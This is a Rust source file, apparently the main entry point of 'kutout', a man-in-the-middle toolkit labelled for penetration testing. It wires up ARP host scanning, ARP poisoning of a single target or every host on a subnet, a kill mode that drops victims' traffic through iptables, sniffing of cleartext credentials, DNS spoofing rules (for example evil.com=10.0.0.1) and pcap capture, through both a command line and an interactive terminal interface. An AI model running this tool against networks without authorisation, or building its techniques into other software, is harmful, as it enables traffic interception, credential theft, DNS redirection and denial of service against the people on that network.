// kutout

mod attacks;
mod capture;
mod net;
mod tui;

use anyhow::{anyhow, Result};
use clap::{Parser, Subcommand};
use crossterm::event::{self, Event, KeyCode, KeyModifiers};
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use crossterm::ExecutableCommand;
use ratatui::backend::CrosstermBackend;
use ratatui::Terminal;
use std::io::stdout;
use std::net::Ipv4Addr;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc, Mutex};
use std::time::{Duration, Instant};

use crate::capture::pcap::PcapWriter;
use crate::net::arp;
use crate::net::firewall;
use crate::net::forwarding::{ForwardConfig, ForwardEvent, SharedDnsRules, SharedTargets};
use crate::net::iface;
use crate::tui::app::{App, LogKind};
use pnet_packet::Packet;

// terminal + firewall cleanup on drop
struct SessionGuard;

impl Drop for SessionGuard {
    fn drop(&mut self) {
        let _ = disable_raw_mode();
        let _ = stdout().execute(LeaveAlternateScreen);
        firewall::cleanup();
    }
}

#[derive(Parser)]
#[command(
    name = "kutout",
    about = "mitm toolkit for penetration testing",
    version
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

// "the first principle is that you must not fool yourself
//  — and you are the easiest person to fool." — richard feynman

#[derive(Subcommand)]
enum Commands {
    /// scan subnet for live hosts
    Scan {
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
        /// cidr range
        #[arg(short, long)]
        range: Option<String>,
        /// timeout seconds
        #[arg(short, long, default_value = "3")]
        timeout: u64,
    },
    /// poison target, start mitm
    Poison {
        /// target ip or "all"
        target: String,
        /// gateway ip or ".1" shorthand
        #[arg(short, long)]
        gateway: Option<String>,
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
        /// drop traffic instead of forwarding
        #[arg(short, long)]
        kill: bool,
        /// sniff cleartext creds
        #[arg(short, long)]
        sniff: bool,
        /// pcap output
        #[arg(short, long)]
        output: Option<PathBuf>,
        /// dns spoof rules (domain=ip)
        #[arg(short, long)]
        dns: Vec<String>,
    },
    /// interactive tui
    Live {
        /// interface
        #[arg(short, long)]
        iface: Option<String>,
    },
    /// list interfaces
    Ifaces,
}

fn main() -> Result<()> {
    env_logger::init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Scan {
            iface,
            range,
            timeout,
        } => cmd_scan(iface, range, timeout),
        Commands::Poison {
            target,
            gateway,
            iface,
            kill,
            sniff,
            output,
            dns,
        } => cmd_poison(target, gateway, iface, kill, sniff, output, dns),
        Commands::Live { iface } => cmd_live(iface),
        Commands::Ifaces => cmd_ifaces(),
    }
}

// resolve interface
fn resolve_iface(name: Option<String>) -> Result<String> {
    match name {
        Some(n) => Ok(n),
        None => iface::auto_detect_iface(),
    }
}

// list interfaces
fn cmd_ifaces() -> Result<()> {
    let interfaces = iface::list_interfaces();
    if interfaces.is_empty() {
        println!("no usable interfaces found");
        return Ok(());
    }

    println!("{:<12} {:<18} {:<16}", "interface", "mac", "ipv4");
    println!("{}", "-".repeat(48));
    for iface in interfaces {
        let mac = iface
            .mac
            .map(|m| iface::format_mac(&m.octets()))
            .unwrap_or_else(|| "??".into());
        let ip = iface
            .ips
            .iter()
            .find(|ip| ip.is_ipv4())
            .map(|ip| ip.ip().to_string())
            .unwrap_or_else(|| "??".into());
        println!("{:<12} {:<18} {:<16}", iface.name, mac, ip);
    }
    Ok(())
}

// arp scan
fn cmd_scan(iface_name: Option<String>, range: Option<String>, timeout: u64) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    let targets = match range {
        Some(cidr) => iface::parse_cidr(&cidr)?,
        None => iface::subnet_hosts(info.ip, info.netmask),
    };

    println!(
        "scanning {} ({}) ... {} targets",
        name,
        info.ip,
        targets.len()
    );

    let stop = Arc::new(AtomicBool::new(false));
    let stop_clone = stop.clone();
    ctrlc_handler(stop_clone);

    let hosts = arp::scan(&info, &targets, Duration::from_secs(timeout), stop)?;

    println!("\n{:<16} {:<18} {}", "ip", "mac", "info");
    println!("{}", "-".repeat(50));
    for host in &hosts {
        let label = if host.ip == info.gateway_ip {
            "(gateway)"
        } else {
            ""
        };
        println!(
            "{:<16} {:<18} {}",
            host.ip,
            iface::format_mac(&host.mac),
            label
        );
    }
    println!("\n{} hosts discovered", hosts.len());

    Ok(())
}

// poison and mitm
fn cmd_poison(
    target: String,
    gateway: Option<String>,
    iface_name: Option<String>,
    kill: bool,
    sniff: bool,
    output: Option<PathBuf>,
    dns_rules: Vec<String>,
) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    let gateway_ip = match gateway {
        Some(g) => iface::expand_gateway_shorthand(&g, info.ip)?,
        None => info.gateway_ip,
    };

    let gateway_mac = resolve_mac(&info, gateway_ip)?;

    let targets = if target.to_lowercase() == "all" {
        let hosts = quick_scan(&info)?;
        hosts
            .into_iter()
            .filter(|h| h.ip != gateway_ip && h.ip != info.ip)
            .map(|h| (h.ip, h.mac))
            .collect::<Vec<_>>()
    } else {
        let target_ip: Ipv4Addr = target.parse().map_err(|_| anyhow!("bad target ip"))?;
        let target_mac = resolve_mac(&info, target_ip)?;
        vec![(target_ip, target_mac)]
    };

    if targets.is_empty() {
        return Err(anyhow!("no targets found"));
    }

    // parse dns rules
    let dns_spoofs: Vec<(String, Ipv4Addr)> = dns_rules
        .iter()
        .filter_map(|rule| {
            let parts: Vec<&str> = rule.splitn(2, '=').collect();
            if parts.len() == 2 {
                let ip: Ipv4Addr = parts[1].parse().ok()?;
                Some((parts[0].to_string(), ip))
            } else {
                None
            }
        })
        .collect();

    println!("poisoning {} target(s) via {}", targets.len(), name);
    if kill {
        println!("mode: kill (dropping all traffic)");
    }
    if sniff {
        println!("credential sniffing: enabled");
    }
    if !dns_spoofs.is_empty() {
        println!("dns spoofs: {} rules", dns_spoofs.len());
    }

    // ip forwarding (restored on drop)
    let _ip_fwd_guard = if !kill {
        match iface::IpForwardGuard::enable() {
            Ok(guard) => {
                println!("ip forwarding: enabled (will restore on exit)");
                Some(guard)
            }
            Err(e) => {
                println!("warning: could not enable ip forwarding: {}", e);
                println!("  run: sysctl -w net.ipv4.ip_forward=1");
                None
            }
        }
    } else {
        if let Ok(true) = iface::ip_forward_enabled() {
            println!("warning: ip_forward is on, kill mode may leak traffic");
        }
        None
    };

    let stop = Arc::new(AtomicBool::new(false));
    let stop_clone = stop.clone();
    ctrlc_handler(stop_clone);

    // poison threads
    let mut poison_handles = Vec::new();
    for (target_ip, target_mac) in &targets {
        let info_clone = info.clone();
        let tip = *target_ip;
        let tmac = *target_mac;
        let gip = gateway_ip;
        let gmac = gateway_mac;
        let stop_c = stop.clone();

        let handle = std::thread::spawn(move || {
            arp::poison_loop(&info_clone, tip, tmac, gip, gmac, Duration::from_secs(2), stop_c)
        });
        poison_handles.push(handle);
    }

    // forwarding
    let (event_tx, event_rx) = mpsc::channel();
    let forward_config = ForwardConfig {
        targets: Arc::new(Mutex::new(targets.clone())),
        gateway_mac,
        kill_mode: kill,
        dns_spoofs: Arc::new(Mutex::new(dns_spoofs)),
        sniff_creds: sniff,
        capture: output.is_some(),
    };

    let info_fwd = info.clone();
    let stop_fwd = stop.clone();
    let fwd_handle = std::thread::spawn(move || {
        net::forwarding::forwarding_loop(&info_fwd, forward_config, event_tx, stop_fwd)
    });

    // pcap
    let mut pcap_writer = match &output {
        Some(path) => Some(PcapWriter::create(path)?),
        None => None,
    };

    // event loop
    while !stop.load(Ordering::Relaxed) {
        match event_rx.recv_timeout(Duration::from_millis(200)) {
            Ok(ForwardEvent::Credential { proto, detail }) => {
                println!("\x1b[33m[cred] [{}] {}\x1b[0m", proto, detail);
            }
            Ok(ForwardEvent::Dropped { src, dst }) => {
                println!("\x1b[31m[kill] {} -> {}\x1b[0m", src, dst);
            }
            Ok(ForwardEvent::RawFrame { data, timestamp_us }) => {
                if let Some(ref mut w) = pcap_writer {
                    let _ = w.write_packet(&data, timestamp_us);
                }
            }
            Ok(ForwardEvent::DnsQuery { name, src }) => {
                println!("[dns] {} -> {}", src, name);
            }
            Ok(ForwardEvent::DnsSpoofed { name, spoof_ip, src }) => {
                println!("\x1b[35m[spoof] {} -> {} => {}\x1b[0m", src, name, spoof_ip);
            }
            Ok(_) => {}
            Err(mpsc::RecvTimeoutError::Timeout) => continue,
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }

    // cleanup
    println!("\nrestoring arp tables...");
    for handle in poison_handles {
        let _ = handle.join();
    }
    drop(fwd_handle);

    if let Some(w) = pcap_writer {
        let count = w.finish()?;
        println!("wrote {} packets to pcap", count);
    }

    println!("done");
    Ok(())
}

// interactive tui
fn cmd_live(iface_name: Option<String>) -> Result<()> {
    let name = resolve_iface(iface_name)?;
    let info = iface::get_iface_info(&name)?;

    let mut app = App::new(name.clone(), info.ip, info.gateway_ip);
    app.push_log(LogKind::Info, format!("started on {}", name));

    // ip forwarding
    let _ip_fwd_guard = match iface::IpForwardGuard::enable() {
        Ok(guard) => {
            app.push_log(LogKind::Info, "ip forwarding enabled".into());
            Some(guard)
        }
        Err(e) => {
            app.push_log(LogKind::Error, format!("ip_forward failed: {}", e));
            None
        }
    };

    // firewall chain
    match firewall::init() {
        Ok(()) => app.push_log(LogKind::Info, "firewall chain ready".into()),
        Err(e) => app.push_log(
            LogKind::Error,
            format!("iptables init failed (kill mode unavailable): {}", e),
        ),
    }

    // terminal setup
    enable_raw_mode()?;
    stdout().execute(EnterAlternateScreen)?;
    let _session = SessionGuard;
    let backend = CrosstermBackend::new(stdout());
    let mut terminal = Terminal::new(backend)?;

    let stop = Arc::new(AtomicBool::new(false));

    // shared state
    let shared_targets: SharedTargets = Arc::new(Mutex::new(Vec::new()));
    let mut poison_stops: Vec<Arc<AtomicBool>> = Vec::new();
    let mut forwarding_spawned = false;

    // channels
    let (event_tx, event_rx) = mpsc::channel::<ForwardEvent>();
    let (scan_tx, scan_rx) = mpsc::channel::<Result<Vec<arp::Host>>>();
    let mut scanning = false;

    // dns rules
    let shared_dns_rules: SharedDnsRules = Arc::new(Mutex::new(Vec::new()));

    // render loop
    let tick_rate = Duration::from_millis(100);
    let mut last_tick = Instant::now();

    loop {
        terminal.draw(|frame| tui::render::draw(frame, &app))?;

        let timeout = tick_rate
            .checked_sub(last_tick.elapsed())
            .unwrap_or(Duration::ZERO);

        if event::poll(timeout)? {
            if let Event::Key(key) = event::read()? {
              if app.input_mode != tui::app::InputMode::Normal {
                // text input
                match key.code {
                    KeyCode::Enter => {
                        let input = app.input_buffer.clone();
                        app.input_buffer.clear();
                        app.input_mode = tui::app::InputMode::Normal;
                        let parts: Vec<&str> = input.splitn(2, '=').collect();
                        if parts.len() == 2 {
                            if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                                let domain = parts[0].to_string();
                                shared_dns_rules
                                    .lock()
                                    .unwrap()
                                    .push((domain.clone(), ip));
                                app.dns_rule_count += 1;
                                app.push_log(
                                    LogKind::Info,
                                    format!("dns spoof: {} -> {}", domain, ip),
                                );
                                app.status_message =
                                    format!("dns rule: {} -> {}", domain, ip);
                            } else {
                                app.status_message = "bad ip in dns rule".into();
                            }
                        } else {
                            app.status_message =
                                "format: domain=ip (e.g. evil.com=10.0.0.1)".into();
                        }
                    }
                    KeyCode::Esc => {
                        app.input_mode = tui::app::InputMode::Normal;
                        app.input_buffer.clear();
                        app.status_message = "cancelled".into();
                    }
                    KeyCode::Backspace => {
                        app.input_buffer.pop();
                    }
                    KeyCode::Char(c) => {
                        app.input_buffer.push(c);
                    }
                    _ => {}
                }
              } else {
                match (key.code, key.modifiers) {
                    (KeyCode::Char('q'), _) | (KeyCode::Char('c'), KeyModifiers::CONTROL) => {
                        app.running = false;
                        stop.store(true, Ordering::Relaxed);
                        for ps in &poison_stops {
                            ps.store(true, Ordering::Relaxed);
                        }
                        break;
                    }
                    (KeyCode::Tab, _) => app.toggle_panel(),
                    (KeyCode::Char('j'), _) | (KeyCode::Down, _) => {
                        match app.active_panel {
                            tui::app::Panel::Hosts => app.scroll_hosts(1),
                            tui::app::Panel::Log => app.scroll_log(1),
                        }
                    }
                    (KeyCode::Char('k'), _) | (KeyCode::Up, _) => {
                        match app.active_panel {
                            tui::app::Panel::Hosts => app.scroll_hosts(-1),
                            tui::app::Panel::Log => app.scroll_log(-1),
                        }
                    }
                    (KeyCode::Char('s'), _) => {
                        // async arp scan
                        if scanning {
                            app.status_message = "scan already in progress".into();
                        } else {
                            scanning = true;
                            app.status_message = "scanning...".into();
                            let info_c = info.clone();
                            let tx = scan_tx.clone();
                            let stop_c = stop.clone();
                            std::thread::spawn(move || {
                                let targets =
                                    iface::subnet_hosts(info_c.ip, info_c.netmask);
                                let result = arp::scan(
                                    &info_c,
                                    &targets,
                                    Duration::from_secs(3),
                                    stop_c,
                                );
                                let _ = tx.send(result);
                            });
                        }
                    }
                    (KeyCode::Char('p'), _) => {
                        // poison selected
                        if let Some(host) = app.hosts.get(app.host_scroll) {
                            let target_ip = host.ip;
                            let target_mac = host.mac;
                            let gateway_ip = info.gateway_ip;

                            match resolve_mac(&info, gateway_ip) {
                                Ok(gateway_mac) => {
                                    if app.poisons.iter().any(|p| p.target_ip == target_ip) {
                                        app.status_message = "already poisoned".into();
                                    } else {
                                        shared_targets
                                            .lock()
                                            .unwrap()
                                            .push((target_ip, target_mac));

                                        let entry = tui::app::PoisonEntry {
                                            target_ip,
                                            target_mac,
                                            gateway_ip,
                                            gateway_mac,
                                            kill_mode: false,
                                            packets_forwarded: 0,
                                        };
                                        app.poisons.push(entry);

                                        let poison_stop = Arc::new(AtomicBool::new(false));
                                        poison_stops.push(poison_stop.clone());
                                        let info_c = info.clone();
                                        std::thread::spawn(move || {
                                            let _ = arp::poison_loop(
                                                &info_c,
                                                target_ip,
                                                target_mac,
                                                gateway_ip,
                                                gateway_mac,
                                                Duration::from_secs(2),
                                                poison_stop,
                                            );
                                        });

                                        // first poison starts forwarding
                                        if !forwarding_spawned {
                                            let fwd_config = ForwardConfig {
                                                targets: shared_targets.clone(),
                                                gateway_mac,
                                                kill_mode: false,
                                                dns_spoofs: shared_dns_rules.clone(),
                                                sniff_creds: true,
                                                capture: false,
                                            };
                                            let fwd_info = info.clone();
                                            let fwd_tx = event_tx.clone();
                                            let fwd_stop = stop.clone();
                                            std::thread::spawn(move || {
                                                let _ = net::forwarding::forwarding_loop(
                                                    &fwd_info, fwd_config, fwd_tx, fwd_stop,
                                                );
                                            });
                                            forwarding_spawned = true;
                                            app.push_log(
                                                LogKind::Info,
                                                "forwarding engine started".into(),
                                            );
                                        }

                                        app.push_log(
                                            LogKind::Info,
                                            format!("poisoning {}", target_ip),
                                        );
                                        app.status_message =
                                            format!("poisoning {}", target_ip);
                                    }
                                }
                                Err(e) => {
                                    app.push_log(
                                        LogKind::Error,
                                        format!("can't resolve gateway mac: {}", e),
                                    );
                                }
                            }
                        }
                    }
                    (KeyCode::Char('x'), _) => {
                        // toggle kill
                        let host_ip = app.hosts.get(app.host_scroll).map(|h| h.ip);
                        if let Some(ip) = host_ip {
                            if let Some(poison) =
                                app.poisons.iter_mut().find(|p| p.target_ip == ip)
                            {
                                poison.kill_mode = !poison.kill_mode;
                                let result = if poison.kill_mode {
                                    firewall::kill(ip)
                                } else {
                                    firewall::unkill(ip)
                                };
                                match result {
                                    Ok(()) => {
                                        let mode = if poison.kill_mode {
                                            "kill"
                                        } else {
                                            "forward"
                                        };
                                        app.push_log(
                                            LogKind::Info,
                                            format!("{} -> {} mode", ip, mode),
                                        );
                                        app.status_message =
                                            format!("{} -> {}", ip, mode);
                                    }
                                    Err(e) => {
                                        poison.kill_mode = !poison.kill_mode;
                                        app.push_log(
                                            LogKind::Error,
                                            format!("iptables failed: {}", e),
                                        );
                                        app.status_message =
                                            "kill mode failed (iptables)".into();
                                    }
                                }
                            } else {
                                app.status_message = "not poisoned yet".into();
                            }
                        }
                    }
                    (KeyCode::Char('c'), _) => {
                        // cure all
                        for ps in &poison_stops {
                            ps.store(true, Ordering::Relaxed);
                        }
                        poison_stops.clear();
                        shared_targets.lock().unwrap().clear();
                        shared_dns_rules.lock().unwrap().clear();
                        app.dns_rule_count = 0;
                        firewall::cleanup();
                        let _ = firewall::init();
                        app.poisons.clear();
                        app.push_log(LogKind::Info, "cured all poisons".into());
                        app.status_message = "all poisons restored".into();
                    }
                    (KeyCode::Char('d'), _) => {
                        // dns input mode
                        app.input_mode = tui::app::InputMode::DnsInput;
                        app.input_buffer.clear();
                        app.status_message = String::new();
                    }
                    _ => {}
                }
              }
            }
        }

        // drain events
        while let Ok(evt) = event_rx.try_recv() {
            app.handle_event(evt);
        }

        // scan results
        if let Ok(result) = scan_rx.try_recv() {
            scanning = false;
            match result {
                Ok(hosts) => {
                    let count = hosts.len();
                    app.hosts = hosts;
                    app.push_log(
                        LogKind::Info,
                        format!("scan: {} hosts found", count),
                    );
                    app.status_message = format!("{} hosts found", count);
                }
                Err(e) => {
                    app.push_log(
                        LogKind::Error,
                        format!("scan failed: {}", e),
                    );
                    app.status_message = "scan failed".into();
                }
            }
        }

        if last_tick.elapsed() >= tick_rate {
            last_tick = Instant::now();
        }
    }

    drop(_session);
    println!("kutout: session ended");

    Ok(())
}

// fast scan, short timeout
fn quick_scan(info: &iface::IfaceInfo) -> Result<Vec<arp::Host>> {
    let targets = iface::subnet_hosts(info.ip, info.netmask);
    let stop = Arc::new(AtomicBool::new(false));
    arp::scan(info, &targets, Duration::from_secs(2), stop)
}

// ip -> mac via cache or arp
fn resolve_mac(info: &iface::IfaceInfo, ip: Ipv4Addr) -> Result<[u8; 6]> {
    if let Some(mac) = iface::lookup_arp_cache(ip) {
        return Ok(mac);
    }

    let (mut tx, mut rx) = arp::open_channel(&info.iface)?;
    let frame = arp::build_arp_frame(
        info.mac,
        [0xff; 6],
        info.mac,
        info.ip,
        [0x00; 6],
        ip,
        false,
    );
    arp::send_arp_frame(tx.as_mut(), &frame)?;

    let deadline = Instant::now() + Duration::from_secs(3);
    while Instant::now() < deadline {
        match rx.next() {
            Ok(data) => {
                let eth = pnet_packet::ethernet::EthernetPacket::new(data);
                if let Some(eth) = eth {
                    if eth.get_ethertype() == pnet_packet::ethernet::EtherTypes::Arp {
                        if let Some(arp_pkt) = pnet_packet::arp::ArpPacket::new(eth.payload()) {
                            if arp_pkt.get_sender_proto_addr() == ip {
                                return Ok(arp_pkt.get_sender_hw_addr().octets());
                            }
                        }
                    }
                }
            }
            Err(_) => continue,
        }
    }

    Err(anyhow!("could not resolve mac for {}", ip))
}

// ctrl-c
fn ctrlc_handler(stop: Arc<AtomicBool>) {
    let _ = ctrlc::set_handler(move || {
        stop.store(true, Ordering::Relaxed);
    });
}
